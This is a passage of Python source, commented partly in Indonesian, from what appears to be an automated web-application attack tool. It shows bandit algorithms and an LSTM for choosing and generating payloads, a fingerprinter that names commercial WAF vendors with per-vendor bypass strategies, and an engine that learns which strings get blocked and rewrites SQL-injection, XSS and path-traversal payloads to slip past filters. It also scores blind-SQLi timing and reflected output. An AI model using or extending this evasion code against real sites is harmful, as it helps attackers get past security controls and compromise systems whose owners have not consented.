    tapi tetap eksplorasi mutasi baru secara probabilistik.
    """
    
    def __init__(self, mutation_types: List[str]):
        self.mutation_types = mutation_types
        self.alpha = {m: 1.0 for m in mutation_types}  # successes + 1
        self.beta_param = {m: 1.0 for m in mutation_types}   # failures + 1
        self.total_selections = 0
        self.successes = {m: 0 for m in mutation_types}
        self.counts = {m: 0 for m in mutation_types}
        
    def select_mutation(self, waf_type: str = "") -> str:
        """Sample dari distribusi Beta, pilih yang tertinggi."""
        samples = {}
        for m in self.mutation_types:
            samples[m] = np.random.beta(self.alpha[m], self.beta_param[m])
        selected = max(samples, key=samples.get)
        self.total_selections += 1
        self.counts[selected] += 1
        return selected
    
    def update_reward(self, mutation: str, reward: float, waf_type: str = ""):
        """Update distribusi Beta berdasarkan reward."""
        if mutation not in self.alpha:
            self.alpha[mutation] = 1.0
            self.beta_param[mutation] = 1.0
            self.successes[mutation] = 0
            self.counts[mutation] = 0
        if reward > 0.5:
            self.alpha[mutation] += reward
            self.successes[mutation] += 1
        else:
            self.beta_param[mutation] += (1.0 - max(0.0, reward))
    
    def get_best_mutations(self, top_k: int = 5, waf_type: str = "") -> List[Tuple[str, float]]:
        """Top-k mutasi berdasarkan expected value Beta."""
        avg_rewards = []
        for m in self.mutation_types:
            if self.counts[m] > 0:
                ev = self.alpha[m] / (self.alpha[m] + self.beta_param[m])
                avg_rewards.append((m, ev))
        avg_rewards.sort(key=lambda x: x[1], reverse=True)
        return avg_rewards[:top_k]
    
    def get_stats(self) -> Dict:
        total_success = sum(self.successes.values())
        total_attempts = sum(self.counts.values())
        overall_rate = total_success / max(1, total_attempts)
        mutation_stats = []
        for mut in self.mutation_types:
            if self.counts[mut] > 0:
                sr = self.successes[mut] / self.counts[mut]
                mutation_stats.append({
                    "mutation": mut,
                    "attempts": self.counts[mut],
                    "successes": self.successes[mut],
                    "success_rate": sr
                })
        mutation_stats.sort(key=lambda x: x["success_rate"], reverse=True)
        return {
            "algorithm": "thompson_sampling",
            "total_selections": self.total_selections,
            "overall_success_rate": overall_rate,
            "top_mutations": mutation_stats[:3]
        }


# ============================================================
# HYBRID BANDIT SELECTOR (v7.0 — Auto-Switch UCB1 ↔ Thompson)
# ============================================================
class HybridBanditSelector:
    """Menggabungkan selector UCB1 dan Thompson untuk pemilihan mutasi."""
    """
    Wrapper yang menggabungkan UCB1 dan Thompson Sampling.
    Otomatis beralih berdasarkan fase serangan:
    - Fase eksplorasi (awal): UCB1 (lebih seimbang)
    - Fase eksploitasi (setelah 30+ iterasi): Thompson (lebih agresif)
    """
    
    def __init__(self, mutation_types: List[str], exploration_constant: float = 2.0):
        self.ucb1 = MutationBanditSelector(mutation_types, exploration_constant)
        self.thompson = ThompsonSamplingBandit(mutation_types)
        self.mutation_types = mutation_types
        self.switch_threshold = 30  # setelah 30 seleksi, pindah ke Thompson
        self.total_selections = 0
        
    def select_mutation(self, waf_type: str = "") -> str:
        self.total_selections += 1
        if self.total_selections <= self.switch_threshold:
            return self.ucb1.select_mutation(waf_type=waf_type)
        else:
            return self.thompson.select_mutation(waf_type=waf_type)
    
    def update_reward(self, mutation: str, reward: float, waf_type: str = ""):
        self.ucb1.update_reward(mutation, reward, waf_type=waf_type)
        self.thompson.update_reward(mutation, reward, waf_type=waf_type)
    
    def get_best_mutations(self, top_k: int = 5, waf_type: str = "") -> List[Tuple[str, float]]:
        if self.total_selections <= self.switch_threshold:
            return self.ucb1.get_best_mutations(top_k, waf_type)
        return self.thompson.get_best_mutations(top_k, waf_type)
    
    def get_stats(self) -> Dict:
        if self.total_selections <= self.switch_threshold:
            stats = self.ucb1.get_stats()
            stats["algorithm"] = "ucb1 (exploration phase)"
        else:
            stats = self.thompson.get_stats()
            stats["algorithm"] = f"thompson (exploitation phase, after {self.switch_threshold} selections)"
        stats["total_selections"] = self.total_selections
        return stats

# ============================================================
# NEURAL PAYLOAD GENERATOR (v6.1 — Lightweight Char-Level LSTM)
# ============================================================
try:
    import torch
    import torch.nn as nn
    from collections import Counter
    import random
    
    class CharLevelLSTMGenerator:
        """
        Lightweight character-level LSTM for generating novel payload strings.
        Trained on successful payloads to learn syntactic patterns.
        """
        
        def __init__(self, hidden_size: int = 128, num_layers: int = 2, seq_length: int = 20):
            self.hidden_size = hidden_size
            self.num_layers = num_layers
            self.seq_length = seq_length
            self.char_to_idx = {}
            self.idx_to_char = {}
            self.vocab_size = 0
            self.model = None
            self.trained = False
            
        def _build_vocab(self, payloads: List[str]):
            """Build character vocabulary from successful payloads."""
            all_chars = set(''.join(payloads))
            # Ensure common special chars are included
            all_chars.update(set('<START><END> '))
            self.char_to_idx = {ch: i for i, ch in enumerate(sorted(all_chars))}
            self.idx_to_char = {i: ch for ch, i in self.char_to_idx.items()}
            self.vocab_size = len(self.char_to_idx)
            
        def _prepare_sequences(self, payloads: List[str]) -> Tuple[torch.Tensor, torch.Tensor]:
            """Convert payloads into input-target sequences for training."""
            sequences = []
            targets = []
            
            for payload in payloads:
                if len(payload) < self.seq_length + 1:
                    continue
                for i in range(len(payload) - self.seq_length):
                    seq_in = payload[i:i+self.seq_length]
                    seq_out = payload[i+1:i+self.seq_length+1]
                    sequences.append([self.char_to_idx[ch] for ch in seq_in])
                    targets.append([self.char_to_idx[ch] for ch in seq_out])
                    
            return torch.tensor(sequences, dtype=torch.long), torch.tensor(targets, dtype=torch.long)
            
        def train(self, successful_payloads: List[str], epochs: int = 50, lr: float = 0.005):
            """Train the LSTM on successful payloads."""
            if not successful_payloads:
                return
                
            self._build_vocab(successful_payloads)
            inputs, targets = self._prepare_sequences(successful_payloads)
            
            if len(inputs) == 0:
                return
                
            # Define model
            self.model = nn.LSTM(
                input_size=self.vocab_size,
                hidden_size=self.hidden_size,
                num_layers=self.num_layers,
                batch_first=True
            )
            self.fc = nn.Linear(self.hidden_size, self.vocab_size)
            
            criterion = nn.CrossEntropyLoss()
            optimizer = torch.optim.Adam(list(self.model.parameters()) + list(self.fc.parameters()), lr=lr)
            
            # Training loop
            self.model.train()
            for epoch in range(epochs):
                optimizer.zero_grad()
                
                # One-hot encode input
                one_hot = torch.zeros(inputs.size(0), inputs.size(1), self.vocab_size)
                one_hot.scatter_(2, inputs.unsqueeze(2), 1)
                
                lstm_out, _ = self.model(one_hot)
                output = self.fc(lstm_out)
                
                loss = criterion(output.reshape(-1, self.vocab_size), targets.reshape(-1))
                loss.backward()
                optimizer.step()
                
            self.trained = True
            
        def generate(self, seed: str = "", length: int = 30) -> str:
            """Generate a new payload string."""
            if not self.trained or not self.model:
                return ""
                
            self.model.eval()
            with torch.no_grad():
                # Use seed or random start
                if seed and len(seed) >= self.seq_length:
                    input_seq = seed[:self.seq_length]
                else:
                    input_seq = random.choice(list(self.char_to_idx.keys())) * self.seq_length
                    
                generated = list(input_seq)
                
                for _ in range(length):
                    # Prepare input
                    idx_seq = [self.char_to_idx.get(ch, 0) for ch in generated[-self.seq_length:]]
                    one_hot = torch.zeros(1, self.seq_length, self.vocab_size)
                    one_hot[0, range(self.seq_length), idx_seq] = 1
                    
                    lstm_out, _ = self.model(one_hot)
                    output = self.fc(lstm_out[:, -1, :])
                    prob = torch.softmax(output, dim=1)
                    next_idx = torch.multinomial(prob, 1).item()
                    next_char = self.idx_to_char.get(next_idx, '')
                    
                    generated.append(next_char)
                    
                return ''.join(generated)
                
except ImportError:
    # Fallback if torch is not available
    class CharLevelLSTMGenerator:
        def __init__(self, *args, **kwargs):
            pass
            
        def train(self, *args, **kwargs):
            pass
            
        def generate(self, *args, **kwargs) -> str:
            return ""

# ============================================================
# SEMANTIC PAYLOAD CLUSTERING (v6.1 — TF-IDF + DBSCAN for Negative Pruning)
# ============================================================
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import DBSCAN
import numpy as np

class SemanticPayloadClusterer:
    """Mengelompokkan payload serupa untuk mengurangi pengujian berulang."""
    """
    Groups payloads into semantic clusters using TF-IDF embeddings and DBSCAN.
    Enables bulk blacklisting of entire clusters when any member is blocked.
    """
    
    def __init__(self, min_cluster_size: int = 3, eps: float = 0.4):
        self.min_cluster_size = min_cluster_size
        self.eps = eps
        self.vectorizer = TfidfVectorizer(
            analyzer='char_wb',
            ngram_range=(2, 5),
            lowercase=False,
            token_pattern=r'.',
            max_features=5000
        )
        self.cluster_labels = None
        self.payloads = []
        self.blacklisted_clusters = set()
        self.payload_to_cluster = {}
        
    def fit(self, payloads: List[str]):
        """Fit the clusterer on a list of payloads."""
        if not payloads:
            return
            
        self.payloads = payloads
        
        # Handle very short payloads by padding or filtering
        processed_payloads = []
        for p in payloads:
            if len(p) < 2:
                processed_payloads.append(p + "  ")  # pad with spaces
            else:
                processed_payloads.append(p)
                
        try:
            X = self.vectorizer.fit_transform(processed_payloads)
            X_dense = X.toarray()
            
            # Normalize to unit vectors for cosine similarity
            norms = np.linalg.norm(X_dense, axis=1, keepdims=True)
            X_normalized = np.divide(X_dense, norms, where=norms!=0)
            
            # Cluster using DBSCAN with cosine distance (1 - dot product)
            clustering = DBSCAN(eps=self.eps, min_samples=self.min_cluster_size, metric='cosine')
            self.cluster_labels = clustering.fit_predict(X_normalized)
            
            # Map each payload to its cluster
            self.payload_to_cluster = {}
            for i, (payload, label) in enumerate(zip(payloads, self.cluster_labels)):
                if label != -1:  # -1 means noise (not in any cluster)
                    self.payload_to_cluster[payload] = label
                    
        except Exception as e:
            # Fallback: no clustering if error occurs
            self.cluster_labels = [-1] * len(payloads)
            self.payload_to_cluster = {}
            
    def get_cluster_id(self, payload: str) -> Optional[int]:
        """Return the cluster ID of a given payload, or None if not clustered."""
        return self.payload_to_cluster.get(payload, None)
        
    def blacklist_cluster(self, payload: str):
        """Blacklist the entire cluster that contains this payload."""
        cluster_id = self.get_cluster_id(payload)
        if cluster_id is not None:
            self.blacklisted_clusters.add(cluster_id)
            
    def is_blacklisted(self, payload: str) -> bool:
        """Check if the payload's cluster is blacklisted."""
        cluster_id = self.get_cluster_id(payload)
        return cluster_id in self.blacklisted_clusters
        
    def get_cluster_members(self, payload: str) -> List[str]:
        """Get all payloads in the same cluster as the given payload."""
        cluster_id = self.get_cluster_id(payload)
        if cluster_id is None:
            return []
        return [p for p, cid in self.payload_to_cluster.items() if cid == cluster_id]
        
    def get_cluster_stats(self) -> Dict:
        """Return statistics about clustering."""
        if self.cluster_labels is None:
            return {"total_payloads": 0, "clustered_payloads": 0, "num_clusters": 0}
            
        labels = np.array(self.cluster_labels)
        num_clusters = len(set(labels)) - (1 if -1 in labels else 0)
        clustered_count = np.sum(labels != -1)
        
        return {
            "total_payloads": len(self.payloads),
            "clustered_payloads": int(clustered_count),
            "num_clusters": num_clusters,
            "blacklisted_clusters": len(self.blacklisted_clusters)
        }

# ============================================================
# REAL-TIME WAF FINGERPRINTING ENGINE (v6.1 — Response-Based Classifier)
# ============================================================
from sklearn.ensemble import RandomForestClassifier
from sklearn.preprocessing import LabelEncoder
import re

class WAFFingerprinter:
    """Mengidentifikasi WAF dari status, header, dan isi respons."""
    """
    Classifies WAF types in real-time based on HTTP response characteristics.
    Uses headers, status codes, and body patterns to predict WAF vendor.
    """
    
    def __init__(self):
        # Known WAF signatures
        self.waf_signatures = {
            'Cloudflare': [
                ('server', r'cloudflare', True),
                ('cf-ray', r'.+', True),
                ('status', '403', False),
                ('body', r'Attention Required!|Cloudflare', False)
            ],
            'Akamai': [
                ('server', r'akamai', True),
                ('status', '403', False),
                ('body', r'AkamaiGHost|Access Denied', False)
            ],
            'ModSecurity': [
                ('server', r'mod_security|ModSecurity', True),
                ('status', '403', False),
                ('body', r'ModSecurity|Request Rejected', False)
            ],
            'Sucuri': [
                ('x-sucuri-id', r'.+', True),
                ('body', r'Sucuri WebSite Firewall', False)
            ],
            'AWS WAF': [
                ('x-amz-cf-id', r'.+', True),
                ('body', r'Request blocked by AWS WAF', False)
            ],
            'F5 BIG-IP ASM': [
                ('server', r'BigIP|F5', True),
                ('body', r'The requested URL was rejected', False)
            ],
            'Imperva': [
                ('x-cdn', r'Incapsula', True),
                ('body', r'Incapsula incident ID', False)
            ]
        }
        
        # Machine learning classifier (trained on historical data)
        self.ml_model = None
        self.label_encoder = LabelEncoder()
        self.is_trained = False
        
        # Feature extraction patterns
        self.header_features = [
            'server', 'x-powered-by', 'x-frame-options', 'x-content-type-options',
            'x-xss-protection', 'content-security-policy', 'cf-ray', 'x-amz-cf-id'
        ]
        
    def extract_features(self, response: Dict) -> Dict[str, Any]:
        """Extract features from HTTP response for classification."""
        headers = response.get('headers', {})
        status = response.get('status_code', 0)
        body = response.get('body', '')
        
        features = {}
        
        # Status code
        features['status_code'] = status
        
        # Header presence and values
        for header in self.header_features:
            if header in headers:
                features[f'has_{header}'] = 1
                # Extract length and presence of keywords
                val = str(headers[header]).lower()
                features[f'{header}_len'] = len(val)
                features[f'{header}_has_id'] = int('id' in val)
                features[f'{header}_has_cloud'] = int('cloud' in val)
            else:
                features[f'has_{header}'] = 0
                features[f'{header}_len'] = 0
                features[f'{header}_has_id'] = 0
                features[f'{header}_has_cloud'] = 0
                
        # Body features
        body_lower = body.lower()
        features['body_len'] = len(body)
        features['body_has_403'] = int('403' in body)
        features['body_has_forbidden'] = int('forbidden' in body_lower)
        features['body_has_blocked'] = int('blocked' in body_lower)
        features['body_has_waf'] = int('waf' in body_lower)
        features['body_has_security'] = int('security' in body_lower)
        
        return features
        
    def rule_based_predict(self, response: Dict) -> Optional[str]:
        """Predict WAF using heuristic rules."""
        headers = response.get('headers', {})
        status = response.get('status_code', 0)
        body = response.get('body', '')
        
        combined_text = f"{str(headers).lower()} {str(status)} {body.lower()}"
        
        scores = {}
        for waf_name, rules in self.waf_signatures.items():
            score = 0
            for field, pattern, is_header in rules:
                if field == 'status':
                    if str(status) == pattern:
                        score += 2
                elif field == 'body':
                    if re.search(pattern, body, re.IGNORECASE):
                        score += 2
                elif is_header and field in headers:
                    if re.search(pattern, str(headers[field]), re.IGNORECASE):
                        score += 3
            if score > 0:
                scores[waf_name] = score
                
        return max(scores, key=scores.get) if scores else None
        
    def train_ml_model(self, historical_data: List[Tuple[Dict, str]]):
        """Train the ML model on historical (response, waf_type) pairs."""
        if not historical_data:
            return
            
        X = []
        y = []
        
        for response, waf_type in historical_data:
            features = self.extract_features(response)
            X.append(list(features.values()))
            y.append(waf_type)
            
        try:
            # Encode labels
            y_encoded = self.label_encoder.fit_transform(y)
            
            # Train classifier
            self.ml_model = RandomForestClassifier(n_estimators=50, random_state=42)
            self.ml_model.fit(X, y_encoded)
            self.is_trained = True
        except Exception:
            self.is_trained = False
            
    def predict(self, response: Dict) -> Tuple[str, float]:
        """
        Predict WAF type with confidence.
        Returns (waf_name, confidence_score).
        """
        # First, try rule-based
        rule_pred = self.rule_based_predict(response)
        if rule_pred:
            return rule_pred, 0.95
            
        # Fallback to ML if available
        if self.is_trained:
            try:
                features = self.extract_features(response)
                X = [list(features.values())]
                proba = self.ml_model.predict_proba(X)[0]
                max_prob = max(proba)
                pred_label = self.ml_model.predict(X)[0]
                waf_name = self.label_encoder.inverse_transform([pred_label])[0]
                return waf_name, float(max_prob)
            except Exception:
                pass
                
        return "Unknown", 0.0
        
    def get_bypass_strategy(self, waf_name: str) -> Dict[str, Any]:
        """Return optimal bypass strategy for a given WAF."""
        strategies = {
            'Cloudflare': {
                'encoding_chain': ['url_encode', 'double_url_encode', 'html_entities'],
                'delay_range': (2.0, 5.0),
                'use_junk': True,
                'polyglot_depth': 3
            },
            'Akamai': {
                'encoding_chain': ['unicode_escape', 'hex_encode', 'case_variation'],
                'delay_range': (1.5, 3.0),
                'use_junk': False,
                'polyglot_depth': 2
            },
            'ModSecurity': {
                'encoding_chain': ['comment_insertion', 'null_byte', 'space_obfuscation'],
                'delay_range': (1.0, 2.5),
                'use_junk': True,
                'polyglot_depth': 4
            },
            'Sucuri': {
                'encoding_chain': ['base64_encode', 'rot13', 'reverse_string'],
                'delay_range': (3.0, 6.0),
                'use_junk': True,
                'polyglot_depth': 2
            }
        }
        
        return strategies.get(waf_name, {
            'encoding_chain': ['case_variation', 'url_encode'],
            'delay_range': (1.0, 2.0),
            'use_junk': False,
            'polyglot_depth': 1
        })

# ============================================================
# WAF SIGNATURE INFERENCE ENGINE (v6.2 — Adaptive Bypass)
# ============================================================
class WAFSignatureInference:
    """Menyimpulkan pola signature WAF dari payload yang diblokir."""
    """
    Learns which substrings/patterns trigger WAF blocking by comparing
    blocked vs unblocked payloads. Then generates targeted mutations
    to evade those exact patterns.
    """
    
    def __init__(self):
        # Store successful (unblocked) and failed (blocked) payloads
        self.successful_payloads: List[str] = []
        self.blocked_payloads: List[str] = []
        self.blocked_responses: List[str] = []
        
        # Inferred signatures: patterns that seem to cause blocking
        self.inferred_signatures: Set[str] = set()
        self.signature_confidence: Dict[str, float] = {}
        
        # Minimum occurrences to consider a pattern as signature
        self.min_occurrences = 3
        
    def record_result(self, payload: str, response_text: str, was_blocked: bool):
        """Store feedback from each test."""
        # v7.0 FIX: Decode payload sebelum disimpan agar analisis n-gram
        # bekerja pada bentuk asli, bukan bentuk encoded
        decoded_payload = payload
        try:
            decoded_payload = unquote(payload)
            # Decode dua kali untuk double-encoding
            if decoded_payload != payload:
                decoded_payload = unquote(decoded_payload)
        except Exception:
            decoded_payload = payload
            
        if was_blocked:
            self.blocked_payloads.append(decoded_payload)
            self.blocked_responses.append(response_text)
        else:
            self.successful_payloads.append(decoded_payload)
            
        # Keep history manageable
        if len(self.blocked_payloads) > 500:
            self.blocked_payloads = self.blocked_payloads[-300:]
            self.blocked_responses = self.blocked_responses[-300:]
        if len(self.successful_payloads) > 500:
            self.successful_payloads = self.successful_payloads[-300:]
            
    def infer_signatures(self) -> Dict[str, float]:
        """
        Compare blocked vs successful payloads to identify patterns that
        correlate with blocking. Returns dict of pattern -> confidence.
        """
        if len(self.blocked_payloads) < self.min_occurrences:
            return {}
            
        # Extract common n-grams from blocked payloads
        from collections import Counter
        blocked_ngrams = Counter()
        success_ngrams = Counter()
        
        def extract_ngrams(text: str, n: int = 4):
            # Character-level n-grams, plus keyword fragments
            grams = set()
            # Character n-grams
            for i in range(len(text) - n + 1):
                grams.add(text[i:i+n])
            # Also split by common separators to get token-level patterns
            tokens = re.split(r'[\s\'"();,<>/\\]', text)
            for tok in tokens:
                if len(tok) > 3:
                    grams.add(tok.lower())
            return grams
            
        for p in self.blocked_payloads:
            for gram in extract_ngrams(p):
                blocked_ngrams[gram] += 1
                
        for p in self.successful_payloads:
            for gram in extract_ngrams(p):
                success_ngrams[gram] += 1
                
        # Find n-grams that appear significantly more in blocked payloads
        signatures = {}
        for gram, count in blocked_ngrams.items():
            if count < self.min_occurrences:
                continue
            success_count = success_ngrams.get(gram, 0)
            # If this gram appears rarely in successful payloads, it's likely a signature
            ratio = count / max(1, success_count + 1)
            if ratio > 1.5:  # at least 50% more frequent in blocked
                confidence = min(1.0, (count - success_count) / max(1, count))
                signatures[gram] = confidence
                
        # Sort by confidence
        sorted_sigs = sorted(signatures.items(), key=lambda x: x[1], reverse=True)
        self.inferred_signatures = {sig for sig, _ in sorted_sigs[:20]}
        self.signature_confidence = dict(sorted_sigs[:20])
        return self.signature_confidence
        
    def generate_evasion_mutation(self, payload: str, category: str) -> str:
        """
        Given a payload that was blocked, generate a variant that avoids
        the inferred signatures by applying targeted mutations.
        """
        if not self.inferred_signatures:
            return payload
            
        mutated = payload
        
        # Identify which signatures exist in this payload
        present_sigs = [sig for sig in self.inferred_signatures if sig in mutated]
        if not present_sigs:
            return payload
            
        # Apply evasion techniques per signature type
        for sig in present_sigs:
            # 1. If signature is a SQL keyword fragment
            if sig.upper() in ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'SLEEP', 'BENCHMARK']:
                # Fragmentation: SELECT → S/**/ELECT
                if len(sig) > 2:
                    pos = random.randint(1, len(sig)-1)
                    mutated = mutated.replace(sig, f"{sig[:pos]}/**/{sig[pos:]}")
                    
            # 2. If signature is a character sequence like "' OR "
            elif "'" in sig or '"' in sig or '`' in sig:
                # Change quoting style: ' → " or backtick
                alt_quotes = {"'": '"', '"': "'", "`": "'"}
                for q in alt_quotes:
                    if q in sig:
                        mutated = mutated.replace(q, alt_quotes[q])
                        
            # 3. If signature is a common XSS tag/event
            elif sig.lower() in ['script', 'onerror', 'onload', 'alert']:
                # Case variation + junk insertion
                mutated = mutated.replace(sig, sig[0] + random.choice(['/*', ''])*2 + sig[1:])
                # Also try URL encoding a character
                if len(sig) > 2:
                    idx = random.randint(1, len(sig)-2)
                    mutated = mutated[:idx] + f"%{ord(sig[idx]):02x}" + mutated[idx+1:]
                    
            # 4. If signature is a path traversal pattern
            elif '..' in sig or sig.startswith('/') or 'etc' in sig.lower():
                # Alternate encoding: double URL encode
                mutated = quote(mutated, safe="")
                
            # 5. Generic: insert null byte or zero-width
            else:
                # Insert zero-width after first character of signature
                if len(sig) > 1:
                    mutated = mutated.replace(sig, sig[0] + '\u200b' + sig[1:])
                    
        # Ensure grammar still valid
        grammar = GrammarValidator()
        valid, _ = grammar.validate(mutated, category)
        if not valid:
            # Fallback: just return original
            return payload
            
        return mutated
        
    def get_signature_summary(self) -> str:
        """Return human-readable summary of inferred signatures."""
        if not self.signature_confidence:
            return "No signatures inferred yet."
        items = sorted(self.signature_confidence.items(), key=lambda x: x[1], reverse=True)[:10]
        return " | ".join([f"'{k}' (conf={v:.2f})" for k, v in items])

# ============================================================
# GRANULAR REWARD ENGINE WITH RATE-LIMIT PENALTY (v6.1)
# ============================================================

class GranularRewardEngine:
    """Menghitung reward terperinci dari status dan karakteristik respons."""
    """
    Computes fine-grained rewards based on multiple response signals.
    Includes progressive penalties for rate-limiting (429) and IP blocking.
    """
    
    def __init__(self):
        self.base_reward = 0.0
        self.time_anomaly_threshold = 1.5  # seconds
        self.body_size_change_threshold = 0.3  # 30% change
        
    def calculate_reward(
        self,
        response: Dict,
        baseline_response: Optional[Dict] = None,
        payload: str = "",
        is_rate_limited: bool = False,
        is_ip_blocked: bool = False,
        baseline_body: str = "",
        baseline_headers: Dict[str, str] = None
    ) -> float:
        if baseline_headers is None:
            baseline_headers = {}
        """
        Calculate reward with multiple signals:
        - High reward: time-based anomalies (SLEEP), body size changes, reflected output
        - Penalty: 429 Too Many Requests, IP blocks, generic errors
        """
        reward = 0.0
        
        status = response.get('status_code', 0)
        headers = response.get('headers', {})
        body = response.get('body', "")
        elapsed = response.get('elapsed', 0.0)
        
        # --- PENALTY SECTION ---
        if is_ip_blocked or status in [403, 406, 999]:
            # Hard block: strong negative reward
            reward -= 1.0
        elif is_rate_limited or status == 429:
            # Rate limit: progressive penalty (worse if repeated)
            reward -= 0.8
        elif status >= 500:
            # Server error: neutral to slightly negative
            reward -= 0.2
            
        # --- REWARD SECTION ---
        else:
            # 1. Time-based anomaly (potential blind SQLi SLEEP success)
            if baseline_response:
                base_elapsed = baseline_response.get('elapsed', 0.1)
                if elapsed > base_elapsed * self.time_anomaly_threshold:
                    reward += 0.7
                    
            # 2. Significant body size change (potential data exfiltration or error leak)
            if baseline_response:
                base_body_len = len(baseline_response.get('body', ""))
                current_len = len(body)
                if base_body_len > 0:
                    change_ratio = abs(current_len - base_body_len) / base_body_len
                    if change_ratio > self.body_size_change_threshold:
                        reward += 0.5
                        
            # 3. Reflected payload without sanitization (XSS/HTMLi indicator)
            if payload and payload in body:
                # Check if it's actually rendered (not inside comment or encoded)
                clean_payload = re.escape(payload[:20])  # avoid huge regex
                if re.search(clean_payload, body, re.IGNORECASE):
                    # Extra check: not inside HTML comment or script string
                    context = body[max(0, body.find(payload)-50):body.find(payload)+50]
                    if not ('<!--' in context or '//' in context or '"' in context or "'" in context):
                        reward += 0.6
                        
            # 4. Success-like status (200 with unusual content)
            if status == 200 and ("error" not in body.lower() and "forbidden" not in body.lower()):
                reward += 0.3
                
        # Clamp reward between -1.0 and +1.0
        return max(-1.0, min(1.0, reward))
        
    def should_backoff(self, status_code: int, headers: Dict) -> Tuple[bool, float]:
        """
        Determine if backoff is needed due to rate limiting.
        Returns (should_backoff, backoff_seconds).
        """
        if status_code == 429:
            # Check Retry-After header
            if 'retry-after' in headers:
                try:
                    delay = float(headers['retry-after'])
                    return True, min(delay, 60.0)  # cap at 60s
                except ValueError:
                    pass
            # Default exponential backoff
            return True, 10.0
            
        # Also check for Cloudflare/Akamai rate limit patterns
        server = headers.get('server', '').lower()
        if 'cloudflare' in server or 'akamai' in server:
            if status_code in [403, 429] and 'cf-ray' in headers:
                return True, 15.0
                
        return False, 0.0

# ============================================================
# STATISTICAL ANOMALY DETECTOR (v7.0 — scipy_stats + cosine + KMeans)
# ============================================================
class StatisticalAnomalyDetector:
    """Mendeteksi anomali waktu dan kemiripan body pada respons HTTP."""
    """
    Deteksi anomali berbasis statistik:
    - scipy_stats.zscore     → timing anomaly (Blind SQLi SLEEP)
    - cosine_similarity      → kemiripan body response vs baseline
    - scipy_cosine           → jarak antar-payload untuk deduplikasi
    - KMeans                 → clustering responses normal vs anomalous
    """

    def __init__(self):
        self.response_times = []       # riwayat waktu respons
        self.response_bodies = []      # riwayat body (sebagai vektor TF sederhana)
        self.response_vectors = []     # vektor fitur untuk KMeans
        self.labels_history = []       # label normal/anomali

    # ---------- scipy_stats: z-score timing ----------
    def record_response_time(self, elapsed_ms: float):
        self.response_times.append(elapsed_ms)

    def detect_timing_anomaly(self, current_ms: float, threshold: float = 2.5) -> bool:
        """Return True jika response time saat ini > threshold z-score."""
        if not HAS_SCIPY or len(self.response_times) < 5:
            return False
        try:
            z = scipy_stats.zscore(self.response_times + [current_ms])
            return bool(abs(z[-1]) > threshold)
        except Exception:
            return False

    # ---------- cosine_similarity: body similarity ----------
    def _body_to_vector(self, body: str) -> list:
        """Konversi body ke vektor frekuensi karakter sederhana (256-dim)."""
        vec = [0] * 256
        for ch in body[:2000]:
            vec[ord(ch) % 256] += 1
        total = sum(vec) or 1
        return [v / total for v in vec]

    def compute_body_similarity(self, body_a: str, body_b: str) -> float:
        """Return cosine similarity [0..1] antara dua body response."""
        if not HAS_SKLEARN:
            return 1.0
        try:
            va = self._body_to_vector(body_a)
            vb = self._body_to_vector(body_b)
            sim = cosine_similarity([va], [vb])[0][0]
            return float(max(0.0, min(1.0, sim)))
        except Exception:
            return 1.0

    # ---------- scipy_cosine: payload distance ----------
    def payload_cosine_distance(self, payload_a: str, payload_b: str) -> float:
        """Return cosine distance [0..2] antara dua payload (untuk dedup)."""
        if not HAS_SCIPY:
            return 1.0
        try:
            va = self._body_to_vector(payload_a)
            vb = self._body_to_vector(payload_b)
            # scipy_cosine raise error jika vektor semua nol
            if sum(va) == 0 or sum(vb) == 0:
                return 1.0
            return float(scipy_cosine(va, vb))
        except Exception:
            return 1.0

    # ---------- KMeans: clustering responses ----------
    def cluster_responses(self, bodies: list, n_clusters: int = 2) -> list:
        """Cluster response bodies menjadi n_clusters kelompok.
        Return list label [0/1/...] untuk setiap body."""
        if not HAS_SKLEARN or len(bodies) < n_clusters:
            return [0] * len(bodies)
        try:
            vectors = [self._body_to_vector(b) for b in bodies]
            km = KMeans(n_clusters=n_clusters, random_state=42, n_init=10)
            labels = km.fit_predict(vectors)
            return labels.tolist()
        except Exception:
            return [0] * len(bodies)

    # ---------- High-level: composite anomaly score ----------
    def anomaly_score(self, current_ms: float, current_body: str,
                      baseline_body: str) -> float:
        """Return skor anomali 0.0–1.0 berdasarkan timing + body similarity."""
        score = 0.0
        # Timing component (0–0.5)
        if self.detect_timing_anomaly(current_ms):
            score += 0.5
        # Body similarity component (0–0.5)
        sim = self.compute_body_similarity(current_body, baseline_body)
        if sim < 0.7:
            score += 0.5 * (1.0 - sim)
        return min(1.0, score)
                
# ============================================================
# DOMAIN SCOPE VALIDATOR (v7.0 — tldextract)
# ============================================================
class DomainScopeValidator:
    """Memastikan URL yang ditemukan masih berada dalam scope domain target."""
    """
    Memastikan semua request tetap dalam scope domain target.
    Menggunakan tldextract untuk parsing domain yang akurat
    (menangani subdomain, ccTLD, dll).
    """

    def __init__(self, target_url: str):
        self.target_url = target_url
        self.allowed_domain = ""
        self.allowed_subdomains = set()
        if HAS_TLDEXTRACT:
            ext = tldextract.extract(target_url)
            self.allowed_domain = f"{ext.domain}.{ext.suffix}"
            self.allowed_subdomains.add(ext.subdomain)
        else:
            # Fallback: gunakan urlparse
            parsed = urlparse(target_url)
            self.allowed_domain = parsed.netloc

    def is_in_scope(self, url: str) -> bool:
        """Return True jika URL masih dalam scope domain target."""
        if not HAS_TLDEXTRACT:
            parsed = urlparse(url)
            return parsed.netloc == self.allowed_domain
        ext = tldextract.extract(url)
        url_domain = f"{ext.domain}.{ext.suffix}"
        return url_domain == self.allowed_domain

    def get_registered_domain(self, url: str = None) -> str:
        """Return registered domain (tanpa subdomain)."""
        if not HAS_TLDEXTRACT:
            return self.allowed_domain
        target = url or self.target_url
        ext = tldextract.extract(target)
        return f"{ext.domain}.{ext.suffix}"

    def add_allowed_subdomain(self, subdomain: str):
        """Tambahkan subdomain yang diizinkan."""
        self.allowed_subdomains.add(subdomain)

# ============================================================
# FAST HTML PARSER (v7.0 — SelectolaxParser fallback)
# ============================================================
class FastHTMLParser:
    """Mengekstrak form, link, dan sumber script dari HTML secara ringan."""
    """
    Parser HTML cepat menggunakan selectolax (jika tersedia).
    Fallback ke regex jika selectolax tidak terinstall.
    Digunakan untuk ekstraksi form dan link di ParameterDiscovery.
    """

    @staticmethod
    def extract_forms(html: str) -> list:
        """Ekstrak semua form dari HTML. Return list of dict."""
        forms = []
        if HAS_SELECTOLAX:
            try:
                tree = SelectoParser(html)
                for form_node in tree.css("form"):
                    form_data = {
                        "action": form_node.attributes.get("action", ""),
